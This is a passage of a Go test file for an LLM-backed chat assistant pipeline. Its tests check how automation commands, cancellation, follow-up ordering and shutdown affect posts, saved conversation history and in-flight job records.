	if client, _ := got.Model.(llm.Client); client.Provider != f.model || got.Search != f.web || got.Fetch != f.web ||
		got.History != f.history || got.Knowledge != f.p.Learning || got.Catalog == nil || got.Clock == nil || got.Log == nil {
		t.Errorf("handler run lacks the pipeline's model, web, history, learning queue, catalog, clock, or log: %+v", got)
	}
	want := []chat.Outgoing{{ConversationID: "c1", ThreadID: "p1", Text: "Starting."}}
	if posts := f.chat.sent(); writes != 1 || !reflect.DeepEqual(posts, want) {
		t.Errorf("posted %+v after %d write permissions, want %+v after 1", posts, writes, want)
	}
	if n := len(f.model.received()); n != 0 || f.history.reads != 0 {
		t.Errorf("%d model requests and %d history reads, want no context and no reply", n, f.history.reads)
	}
	turn := `{"context_id":"p1","is_dm":false,"scope":"public","user_id":"u1"} {"assistant":"Analysis of Acme Co","user":"u1: @helper please /BRAND  Acme Co \nthanks"}`
	if w := f.history.written(); !slices.Equal(w, []string{"u1 " + turn, "thread:p1 " + turn}) {
		t.Errorf("history writes:\n%s", strings.Join(w, "\n"))
	}
	raw, _, _ := f.learning.Get(t.Context(), "agent:public_kb_batch")
	var batch struct{ Messages []struct{ Message string } }
	_ = json.Unmarshal(raw, &batch)
	if want := "u1: @helper please /BRAND  Acme Co \nthanks\nagent: Analysis of Acme Co"; len(batch.Messages) != 1 || batch.Messages[0].Message != want {
		t.Errorf("learning batch = %s, want one entry with %q", raw, want)
	}
}

func TestAutomationCancelledBeforeItsFirstPostWritesNothingButOnceStartedKeepsPosting(t *testing.T) {
	f := newFixture(t)
	ctx, cancel := context.WithCancel(t.Context())
	var errs []error
	f.automate(t, func(ctx context.Context, r automation.Run) (string, error) {
		post := chat.Outgoing{ConversationID: "c1", Text: "step"}
		if r.Args["name"] == "late" {
			_, err := r.Chat.Send(ctx, post)
			errs = append(errs, err)
		}
		cancel()
		_, err := r.Chat.Send(ctx, post)
		errs = append(errs, err)
		return "", ctx.Err()
	})
	writes := 0
	permit := func(context.Context) error { writes++; return nil }
	m := chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "/brand early", Kind: chat.Direct}
	if err := f.p.Answer(ctx, job("dm:u1", m), permit); !errors.Is(err, context.Canceled) {
		t.Fatalf("Answer = %v, want cancelled", err)
	}
	if writes != 0 || len(f.chat.sent()) != 0 || !errors.Is(errs[0], context.Canceled) {
		t.Errorf("cancelled before posting: %d write permissions, posts %+v, Send error %v", writes, f.chat.sent(), errs[0])
	}

	ctx, cancel = context.WithCancel(t.Context())
	defer cancel()
	errs = nil
	m.Text = "/brand late"
	_ = f.p.Answer(ctx, job("dm:u1", m), permit)
	if writes != 2 || len(f.chat.sent()) != 2 || errs[1] != nil {
		t.Errorf("cancelled after posting: %d write permissions, %d posts, second Send error %v; want 2, 2, nil", writes, len(f.chat.sent()), errs[1])
	}
}

func TestAutomationFailureReplyOrErrorSavesNothing(t *testing.T) {
	broken := errors.New("search unavailable")
	for _, tc := range []struct {
		reply string
		err   error
	}{
		{"Could not analyze [ERR_BRAND_ANALYSIS] timeout", nil},
		{"", broken},
	} {
		f := newFixture(t)
		f.automate(t, func(context.Context, automation.Run) (string, error) { return tc.reply, tc.err })
		m := chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "/brand Acme", Kind: chat.Direct}
		if err := f.p.Answer(t.Context(), job("dm:u1", m), allowWrites); !errors.Is(err, tc.err) {
			t.Errorf("Answer = %v, want %v", err, tc.err)
		}
		if n := len(f.history.written()) + len(f.chat.sent()) + len(f.model.received()); n != 0 {
			t.Errorf("reply %q, error %v: %d turns, posts, and model requests, want none", tc.reply, tc.err, n)
		}
	}
}

// running is a scheduler that answers with a fixture's pipeline on four workers.
type running struct {
	s       *pipeline.Scheduler
	records *recordsFake
	abort   context.CancelFunc
	stop    context.CancelFunc
	ran     chan struct{}
}

func (f *fixture) run(t *testing.T) *running {
	r := &running{records: &recordsFake{trace: &trace{}, held: map[string]bool{}}, ran: make(chan struct{})}
	intake, stopIntake := context.WithCancel(context.Background())
	work, abort := context.WithCancel(context.Background())
	runCtx, stop := context.WithCancel(context.Background())
	r.abort, r.stop = abort, func() { stopIntake(); stop() }
	r.s = pipeline.NewScheduler(intake, work, f.p.Answer, r.records, 4, time.Hour, clock.Real(), slog.New(slog.DiscardHandler))
	go func() {
		defer close(r.ran)
		_ = r.s.Run(runCtx)
	}()
	t.Cleanup(func() {
		r.stop()
		abort()
		<-r.ran
	})
	return r
}

func (r *running) submit(t *testing.T, j routing.Job) {
	t.Helper()
	r.records.mu.Lock()
	r.records.held[j.Generation] = true
	r.records.mu.Unlock()
	submit, _, err := r.s.Reserve(t.Context())
	if err != nil {
		t.Fatal(err)
	}
	submit(j)
	synctest.Wait()
}

// shutdown stops the scheduler, cancels the runs still going as the shutdown timeout does, and waits for them.
func (r *running) shutdown() {
	r.stop()
	synctest.Wait()
	r.abort()
	<-r.ran
}

func TestFollowUpIsAnsweredAfterTheReplyItFollowsAndSeesItsTurn(t *testing.T) {
	synctest.Test(t, func(t *testing.T) {
		f := newFixture(t)
		f.model.answers = []string{"first reply", "second reply"}
		f.model.hold = make(chan struct{})
		r := f.run(t)
		r.submit(t, job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "one", Kind: chat.Direct}))
		r.submit(t, job("dm:u1", chat.Message{ID: "p2", ConversationID: "c1", AuthorID: "u1", Text: "two", Kind: chat.Direct}))
		if got := len(f.model.received()); got != 1 {
			t.Fatalf("model requests while the first run is going = %d, want 1", got)
		}
		close(f.model.hold)
		synctest.Wait()
		if got := f.chat.sent(); len(got) != 2 || got[0].Text != "first reply" || got[1].Text != "second reply" {
			t.Fatalf("posted %+v, want the first reply, then the second", got)
		}
		second := f.model.received()[1].Messages
		var history []string
		for _, m := range second[1 : len(second)-1] {
			history = append(history, m.Content)
		}
		if want := []string{"u1: one", "first reply"}; !slices.Equal(history, want) {
			t.Errorf("second run's history = %q, want %q", history, want)
		}
	})
}

func TestRunCutBeforeItsReplyKeepsItsRecordAndLeavesNoTrace(t *testing.T) {
	cases := []struct {
		name  string
		setup func(*fixture)
	}{
		{"while generating", func(f *fixture) { f.model.hold = make(chan struct{}) }},
		{"while looking up the agent's username", func(f *fixture) {
			f.chat.identity = chat.User{ID: agentID}
			f.chat.selfWaits = true
		}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			synctest.Test(t, func(t *testing.T) {
				f := newFixture(t)
				tc.setup(f)
				r := f.run(t)
				r.submit(t, job("thread:p1:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "@helper hi", Kind: chat.Public}))
				r.shutdown()
				if !r.records.holds("g-p1") {
					t.Error("run cut before its reply lost its in-flight record")
				}
				if got := len(f.chat.sent()) + len(f.history.written()); got != 0 {
					t.Errorf("run cut before its reply posted or saved %d times", got)
				}
			})
		})
	}
}

func TestRunCutWhilePostingItsReplyStillSavesTheTurnAndReleasesItsRecord(t *testing.T) {
	synctest.Test(t, func(t *testing.T) {
		f := newFixture(t)
		f.chat.hold = make(chan struct{})
		r := f.run(t)
		r.submit(t, job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct}))
		r.stop()
		synctest.Wait()
		r.abort()
		close(f.chat.hold)
		<-r.ran
		if r.records.holds("g-p1") {
			t.Error("run cut while posting kept its in-flight record, so the next start would post again")
		}
		if got := len(f.chat.sent()); got != 1 {
			t.Errorf("posts = %d, want 1", got)
		}
		if got := len(f.history.written()); got != 1 {
			t.Errorf("turns saved = %d, want 1", got)
		}
	})
}

func TestRunWhoseRecordIsGonePostsAndSavesNothing(t *testing.T) {
	synctest.Test(t, func(t *testing.T) {
		f := newFixture(t)
		r := f.run(t)
		submit, _, err := r.s.Reserve(t.Context())
		if err != nil {
			t.Fatal(err)
		}
		submit(job("dm:u1", chat.Message{ID: "p1", ConversationID: "c1", AuthorID: "u1", Text: "hi", Kind: chat.Direct}))
		synctest.Wait()
		if got := len(f.chat.sent()) + len(f.history.written()); got != 0 {
			t.Errorf("run whose record another process released posted or saved %d times", got)
		}
	})
}
